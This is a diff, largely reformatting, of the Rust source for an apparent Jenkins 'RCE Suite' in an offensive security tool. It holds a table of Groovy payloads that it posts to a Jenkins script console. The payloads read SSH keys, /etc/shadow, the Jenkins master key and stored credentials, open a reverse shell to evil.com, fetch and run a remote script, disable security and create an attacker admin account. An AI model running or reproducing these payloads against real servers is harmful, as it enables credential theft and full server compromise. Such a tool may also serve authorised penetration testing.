@@ -21,7 +21,10 @@ const JENKINS_ENDPOINTS: &[(&str, &str)] = &[
     ("API JSON", "/api/json"),
     ("Computer API", "/computer/api/json"),
     ("People", "/asynchPeople/api/json"),
-    ("Builds", "/api/json?tree=jobs[name,builds[number,result,timestamp]]"),
+    (
+        "Builds",
+        "/api/json?tree=jobs[name,builds[number,result,timestamp]]",
+    ),
     ("Plugins", "/pluginManager/api/json"),
     ("Credentials", "/credentials/store/system/domain/_/api/json"),
     ("Script console", "/script"),
@@ -34,45 +37,113 @@ const JENKINS_ENDPOINTS: &[(&str, &str)] = &[
     ("Load statistics", "/load-statistics/api/json"),
     ("Queue", "/queue/api/json"),
     ("Build queue", "/queue/api/json?tree=items[id,task[name]]"),
-    ("Nodes", "/computer/api/json?tree=computer[displayName,offline,executors]"),
-    ("Artifacts", "/api/json?tree=jobs[name,builds[artifacts[fileName,relativePath]]]"),
+    (
+        "Nodes",
+        "/computer/api/json?tree=computer[displayName,offline,executors]",
+    ),
+    (
+        "Artifacts",
+        "/api/json?tree=jobs[name,builds[artifacts[fileName,relativePath]]]",
+    ),
 ];
 
 const GROOVY_PAYLOADS: &[(&str, &str)] = &[
     ("Command execution", "println \"whoami\".execute().text"),
-    ("Command execution — array", "println [\"sh\", \"-c\", \"whoami\"].execute().text"),
+    (
+        "Command execution — array",
+        "println [\"sh\", \"-c\", \"whoami\"].execute().text",
+    ),
     ("Env exfil", "println \"env\".execute().text"),
     ("Read /etc/passwd", "println new File(\"/etc/passwd\").text"),
-    ("Read ~/.ssh/id_rsa", "println new File(System.getProperty(\"user.home\") + \"/.ssh/id_rsa\").text"),
-    ("List Jenkins secrets", "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets\").listFiles()"),
-    ("List credentials", "def creds = Jenkins.instance.getExtensionList(com.cloudbees.plugins.credentials.SystemCredentialsProvider.class)[0].getCredentials(); creds.each { println it }"),
-    ("Decrypt secrets", "println hudson.util.Secret.fromString(\"ENCRYPTED_SECRET\").getEncryptedValue()"),
-    ("Master key", "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets/master.key\").text"),
-    ("List jobs", "Jenkins.instance.items.each { println it.name + \" \" + it.configFile }"),
-    ("Read job config", "Jenkins.instance.items.each { println it.name + \": \" + new File(it.rootDir, \"config.xml\").text }"),
-    ("Execute shell", "def proc = \"id; cat /etc/shadow\".execute(); println proc.text"),
-    ("Reverse shell", "def socket = new Socket(\"evil.com\", 4444); def proc = [\"/bin/sh\", \"-i\"].execute();"),
-    ("Download file", "def url = new URL(\"https://evil.com/shell.sh\"); def f = new File(\"/tmp/shell.sh\"); f << url.text; f.exec()"),
-    ("Disable security", "Jenkins.instance.getDescriptor(org.jenkinsci.main.modules.instance_identity.InstanceIdentityProvider.class).setEnabled(false)"),
-    ("Create admin", "def user = hudson.model.User.get(\"attacker\"); user.setFullName(\"Attacker\"); def pwd = hudson.security.HudsonPrivateSecurityRealm.Details.fromPlainPassword(\"attacker123\"); user.addProperty(pwd)"),
-    ("Read environment", "System.getenv().each { println it.key + \"=\" + it.value }"),
-    ("Read system props", "System.getProperties().each { println it.key + \"=\" + it.value }"),
-    ("Thread dump", "Thread.getAllStackTraces().keySet().each { println it.getName() }"),
-    ("File system listing", "new File(\"/\").listFiles().each { println it.getAbsolutePath() }"),
-    ("Network scan", "def socket = new Socket(); socket.connect(new InetSocketAddress(\"127.0.0.1\", 8080), 1000); println \"open\""),
+    (
+        "Read ~/.ssh/id_rsa",
+        "println new File(System.getProperty(\"user.home\") + \"/.ssh/id_rsa\").text",
+    ),
+    (
+        "List Jenkins secrets",
+        "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets\").listFiles()",
+    ),
+    (
+        "List credentials",
+        "def creds = Jenkins.instance.getExtensionList(com.cloudbees.plugins.credentials.SystemCredentialsProvider.class)[0].getCredentials(); creds.each { println it }",
+    ),
+    (
+        "Decrypt secrets",
+        "println hudson.util.Secret.fromString(\"ENCRYPTED_SECRET\").getEncryptedValue()",
+    ),
+    (
+        "Master key",
+        "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets/master.key\").text",
+    ),
+    (
+        "List jobs",
+        "Jenkins.instance.items.each { println it.name + \" \" + it.configFile }",
+    ),
+    (
+        "Read job config",
+        "Jenkins.instance.items.each { println it.name + \": \" + new File(it.rootDir, \"config.xml\").text }",
+    ),
+    (
+        "Execute shell",
+        "def proc = \"id; cat /etc/shadow\".execute(); println proc.text",
+    ),
+    (
+        "Reverse shell",
+        "def socket = new Socket(\"evil.com\", 4444); def proc = [\"/bin/sh\", \"-i\"].execute();",
+    ),
+    (
+        "Download file",
+        "def url = new URL(\"https://evil.com/shell.sh\"); def f = new File(\"/tmp/shell.sh\"); f << url.text; f.exec()",
+    ),
+    (
+        "Disable security",
+        "Jenkins.instance.getDescriptor(org.jenkinsci.main.modules.instance_identity.InstanceIdentityProvider.class).setEnabled(false)",
+    ),
+    (
+        "Create admin",
+        "def user = hudson.model.User.get(\"attacker\"); user.setFullName(\"Attacker\"); def pwd = hudson.security.HudsonPrivateSecurityRealm.Details.fromPlainPassword(\"attacker123\"); user.addProperty(pwd)",
+    ),
+    (
+        "Read environment",
+        "System.getenv().each { println it.key + \"=\" + it.value }",
+    ),
+    (
+        "Read system props",
+        "System.getProperties().each { println it.key + \"=\" + it.value }",
+    ),
+    (
+        "Thread dump",
+        "Thread.getAllStackTraces().keySet().each { println it.getName() }",
+    ),
+    (
+        "File system listing",
+        "new File(\"/\").listFiles().each { println it.getAbsolutePath() }",
+    ),
+    (
+        "Network scan",
+        "def socket = new Socket(); socket.connect(new InetSocketAddress(\"127.0.0.1\", 8080), 1000); println \"open\"",
+    ),
 ];
 
 pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
     println!("{} Jenkins RCE Suite", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL: {}", "[*]".cyan().bold(), url);
-    println!("{} {} API endpoints, {} Groovy payloads", "[*]".cyan().bold(), JENKINS_ENDPOINTS.len(), GROOVY_PAYLOADS.len());
+    println!(
+        "{} {} API endpoints, {} Groovy payloads",
+        "[*]".cyan().bold(),
+        JENKINS_ENDPOINTS.len(),
+        GROOVY_PAYLOADS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
     let base = url.trim_end_matches('/');
 
-    println!("\n{} [1/3] Jenkins endpoint discovery...", "[*]".cyan().bold());
+    println!(
+        "\n{} [1/3] Jenkins endpoint discovery...",
+        "[*]".cyan().bold()
+    );
     let mut found = Vec::new();
     let mut unauthenticated = false;
 
@@ -84,21 +155,37 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                 let has_jenkins_header = resp.headers().get("x-jenkins").is_some()
                     || resp.headers().get("x-hudson").is_some();
                 let body = resp.text().await.unwrap_or_default();
-                let is_html = body.starts_with("<!DOCTYPE") || body.starts_with("<html") || body.contains("<head>");
+                let is_html = body.starts_with("<!DOCTYPE")
+                    || body.starts_with("<html")
+                    || body.contains("<head>");
                 let is_jenkins = has_jenkins_header
-                    || body.contains("Jenkins") || body.contains("hudson")
-                    || body.contains("jenkins-") || body.contains("Jenkins-Crumb");
+                    || body.contains("Jenkins")
+                    || body.contains("hudson")
+                    || body.contains("jenkins-")
+                    || body.contains("Jenkins-Crumb");
                 let accessible = status == 200 && is_jenkins && !is_html;
                 let has_json = body.contains("{") && body.contains("}") && !is_html;
-                let has_creds = is_jenkins && (body.contains("credential") || body.contains("\"secret\"") || body.contains("\"password\""));
-                let has_jobs = is_jenkins && (body.contains("\"jobs\"") || body.contains("\"builds\"") || body.contains("\"_class\""));
+                let has_creds = is_jenkins
+                    && (body.contains("credential")
+                        || body.contains("\"secret\"")
+                        || body.contains("\"password\""));
+                let has_jobs = is_jenkins
+                    && (body.contains("\"jobs\"")
+                        || body.contains("\"builds\"")
+                        || body.contains("\"_class\""));
                 let has_script = path.contains("script");
                 let tag = if accessible {
-                    if has_script { "SCRIPT CONSOLE".red().bold().to_string() }
-                    else if has_creds { "CREDENTIALS".red().bold().to_string() }
-                    else if has_jobs { "JOBS".green().bold().to_string() }
-                    else if has_json { "API".green().to_string() }
-                    else { "accessible".green().to_string() }
+                    if has_script {
+                        "SCRIPT CONSOLE".red().bold().to_string()
+                    } else if has_creds {
+                        "CREDENTIALS".red().bold().to_string()
+                    } else if has_jobs {
+                        "JOBS".green().bold().to_string()
+                    } else if has_json {
+                        "API".green().to_string()
+                    } else {
+                        "accessible".green().to_string()
+                    }
                 } else if status == 403 {
                     "forbidden".yellow().to_string()
                 } else if status == 401 {
@@ -117,7 +204,11 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                         unauthenticated = true;
                     }
                     if has_creds {
-                        println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
+                        println!(
+                            "    {} {}",
+                            ">".red().bold(),
+                            body.chars().take(200).collect::<String>()
+                        );
                     }
                 }
             }
@@ -133,7 +224,8 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
 
     for (name, payload) in GROOVY_PAYLOADS {
         let body = format!("script={}", urlencoding_encode(payload));
-        match client.post(&script_url)
+        match client
+            .post(&script_url)
             .header("Content-Type", "application/x-www-form-urlencoded")
             .body(body)
             .send()
@@ -143,15 +235,27 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                 let status = resp.status().as_u16();
                 let has_jenkins_hdr = resp.headers().get("x-jenkins").is_some();
                 let resp_body = resp.text().await.unwrap_or_default();
-                let is_html = resp_body.starts_with("<!DOCTYPE") || resp_body.starts_with("<html") || resp_body.contains("<head>");
+                let is_html = resp_body.starts_with("<!DOCTYPE")
+                    || resp_body.starts_with("<html")
+                    || resp_body.contains("<head>");
                 let has_jenkins = has_jenkins_hdr
-                    || resp_body.contains("Jenkins") || resp_body.contains("hudson");
-                let has_error = resp_body.contains("Exception") || resp_body.contains("GroovyError") || resp_body.contains("java.lang.");
-                let has_result = !resp_body.is_empty() && !is_html && has_jenkins
+                    || resp_body.contains("Jenkins")
+                    || resp_body.contains("hudson");
+                let has_error = resp_body.contains("Exception")
+                    || resp_body.contains("GroovyError")
+                    || resp_body.contains("java.lang.");
+                let has_result = !resp_body.is_empty()
+                    && !is_html
+                    && has_jenkins
                     && (resp_body.contains("Result:") || !resp_body.contains("error"));
-                let has_data = !is_html && has_jenkins
-                    && (resp_body.contains("root:") || resp_body.contains("uid=") || resp_body.contains("SECRET")
-                        || resp_body.contains("\"credentials\"") || resp_body.contains("\"password\"") || resp_body.contains("\"open\""));
+                let has_data = !is_html
+                    && has_jenkins
+                    && (resp_body.contains("root:")
+                        || resp_body.contains("uid=")
+                        || resp_body.contains("SECRET")
+                        || resp_body.contains("\"credentials\"")
+                        || resp_body.contains("\"password\"")
+                        || resp_body.contains("\"open\""));
 
                 let tag = if has_data {
                     "DATA EXFIL".red().bold().to_string()
@@ -167,14 +271,30 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                     format!("status {}", status)
                 };
 
-                println!("  {} [{:02}] {:35} status={} {}", "*".cyan(), rce_results.len() + 1, name, status, tag);
+                println!(
+                    "  {} [{:02}] {:35} status={} {}",
+                    "*".cyan(),
+                    rce_results.len() + 1,
+                    name,
+                    status,
+                    tag
+                );
                 if has_data || (has_result && !has_error) {
-                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        resp_body.chars().take(200).collect::<String>()
+                    );
                     rce_results.push(*name);
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:35} error", "*".red(), rce_results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:35} error",
+                    "*".red(),
+                    rce_results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -186,13 +306,33 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
             let status = resp.status().as_u16();
             let has_jenkins = resp.headers().get("x-jenkins").is_some();
             let body = resp.text().await.unwrap_or_default();
-            let is_html = body.starts_with("<!DOCTYPE") || body.starts_with("<html") || body.contains("<head>");
-            let has_creds = !is_html && has_jenkins
-                && (body.contains("\"credentials\"") || body.contains("\"secret\"") || body.contains("\"username\""));
-            let tag = if has_creds { "CREDENTIALS FOUND".red().bold().to_string() } else if is_html { "not jenkins".dimmed().to_string() } else { format!("status {}", status) };
-            println!("  {} Credentials API: status={} {}", "*".cyan(), status, tag);
+            let is_html = body.starts_with("<!DOCTYPE")
+                || body.starts_with("<html")
+                || body.contains("<head>");
+            let has_creds = !is_html
+                && has_jenkins
+                && (body.contains("\"credentials\"")
+                    || body.contains("\"secret\"")
+                    || body.contains("\"username\""));
+            let tag = if has_creds {
+                "CREDENTIALS FOUND".red().bold().to_string()
+            } else if is_html {
+                "not jenkins".dimmed().to_string()
+            } else {
+                format!("status {}", status)
+            };
+            println!(
+                "  {} Credentials API: status={} {}",
+                "*".cyan(),
+                status,
+                tag
+            );
             if has_creds {
-                println!("    {} {}", ">".red().bold(), body.chars().take(300).collect::<String>());
+                println!(
+                    "    {} {}",
+                    ">".red().bold(),
+                    body.chars().take(300).collect::<String>()
+                );
             }
         }
         Err(_) => {
@@ -209,24 +349,54 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
     );
 
     if unauthenticated {
-        println!("{} [CRITICAL] Unauthenticated access to Jenkins API!", "[!]".red().bold());
+        println!(
+            "{} [CRITICAL] Unauthenticated access to Jenkins API!",
+            "[!]".red().bold()
+        );
     }
-    let has_script = found.iter().any(|n| n.contains("Script") || n.contains("script"));
+    let has_script = found
+        .iter()
+        .any(|n| n.contains("Script") || n.contains("script"));
     if has_script {
-        println!("{} [CRITICAL] Script console accessible — full RCE!", "[!]".red().bold());
+        println!(
+            "{} [CRITICAL] Script console accessible — full RCE!",
+            "[!]".red().bold()
+        );
     }
     if !rce_results.is_empty() {
-        let has_cred = rce_results.iter().any(|n| n.contains("credential") || n.contains("Credential") || n.contains("secret") || n.contains("Secret") || n.contains("Master"));
-        let has_file = rce_results.iter().any(|n| n.contains("Read") || n.contains("List") || n.contains("File"));
-        let has_exec = rce_results.iter().any(|n| n.contains("Command") || n.contains("Execute") || n.contains("shell") || n.contains("reverse"));
+        let has_cred = rce_results.iter().any(|n| {
+            n.contains("credential")
+                || n.contains("Credential")
+                || n.contains("secret")
+                || n.contains("Secret")
+                || n.contains("Master")
+        });
+        let has_file = rce_results
+            .iter()
+            .any(|n| n.contains("Read") || n.contains("List") || n.contains("File"));
+        let has_exec = rce_results.iter().any(|n| {
+            n.contains("Command")
+                || n.contains("Execute")
+                || n.contains("shell")
+                || n.contains("reverse")
+        });
         if has_cred {
-            println!("{} [CRITICAL] Credential/secret extraction successful!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] Credential/secret extraction successful!",
+                "[!]".red().bold()
+            );
         }
         if has_file {
-            println!("{} [HIGH] File system access confirmed!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] File system access confirmed!",
+                "[!]".red().bold()
+            );
         }
         if has_exec {
-            println!("{} [CRITICAL] Command execution confirmed — full server compromise!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] Command execution confirmed — full server compromise!",
+                "[!]".red().bold()
+            );
         }
     }
 
